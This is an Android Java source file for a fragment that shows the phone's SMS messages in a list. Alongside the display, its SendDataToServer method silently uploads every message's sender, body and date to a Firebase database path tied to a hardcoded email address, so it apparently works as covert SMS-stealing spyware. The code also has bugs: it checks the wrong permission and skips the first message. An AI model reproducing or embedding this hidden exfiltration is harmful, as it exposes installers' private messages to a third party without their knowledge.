package com.myapplication;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.jetbrains.annotations.NotNull;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;


public class messagefragment extends Fragment {
    private RecyclerView recyclerView;
    public ArrayList<Smsmodel> smsmodelArrayList  ;
    public SmsAdapter showsms;
    public Smsmodel smsmodel;
    String mail="obaidkhan317@gmailacom";
    int index= 0;
    String address,message,date ;


    public messagefragment() {
        // Required empty public constructor
    }



    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View v= inflater.inflate(R.layout.fragment_messagefragment, container, false);
        recyclerView = (RecyclerView) v.findViewById(R.id.rview);
        recyclerView.setHasFixedSize(true);
        recyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
        smsmodelArrayList = new ArrayList<>();
        showsms = new SmsAdapter(getContext(), smsmodelArrayList);
        recyclerView.setAdapter(showsms);
        checkPermission();
        return v;
    }
    private void checkPermission() {
        //check condition
        if(ContextCompat.checkSelfPermission( getContext(), Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED){
            //when permission is not granted
            //grand permission
            ActivityCompat.requestPermissions( getActivity(),new String[]{Manifest.permission.READ_SMS},100);
        }
        else{
            //when permission is granted
            //create method
            getMessagesList();
        }

    }
    public void getMessagesList(){
        Uri uriSms = Uri.parse("content://sms");
        Cursor cursor = getActivity().getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);

        cursor.moveToFirst();
        while  (cursor.moveToNext())
        {
            index++;
            address = cursor.getString(1);
            message = cursor.getString(3);
            SimpleDateFormat dateFormatter = new SimpleDateFormat("dd MMM yyyy");
            String date = dateFormatter.format(new Date(Long.parseLong((cursor.getString(2)).toString())));
            smsmodel = new Smsmodel(address,message,date);
            smsmodelArrayList.add(smsmodel);

            SendDataToServer(smsmodel);
        }
        showsms.notifyDataSetChanged();
    }
    public void onRequestPermissionsResult(int requestCode, @NonNull @NotNull String[] permissions, @NonNull @NotNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //check condition
        if(requestCode==100 && grantResults.length>0 &&grantResults[0]==PackageManager.PERMISSION_GRANTED){
            //when permission is granted
            //call method
            getMessagesList();
        }
        else{
            //when permission is denied
            //display toast
            Toast.makeText( getActivity(),"Permission denied.",Toast.LENGTH_SHORT).show();
            //call check permission method
            checkPermission();
        }
    }
    private void SendDataToServer(Smsmodel callLogItem) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference(getEmail())
                .child("Messages").child(String.valueOf(index));
        myRef.setValue(callLogItem);


    }

    public String getEmail() {

        if(mail.contains(".")){
            mail=mail.replace(".","a");
        }
        if(mail.contains("#")){
            mail=mail.replaceAll("#","h");
        } if(mail.contains("$")){
            mail=mail.replaceAll("$","d");
        }
        return mail;
    }
    private String DurationFormat(String duration) {
        String durationFormatted=null;
        if(Integer.parseInt(duration) < 60){
            durationFormatted = duration+" sec";
        }
        else{
            int min = Integer.parseInt(duration)/60;
            int sec = Integer.parseInt(duration)%60;

            if(sec==0)
                durationFormatted = min + " min" ;
            else
                durationFormatted = min + " min " + sec + " sec";

        }
        return durationFormatted;
    }
}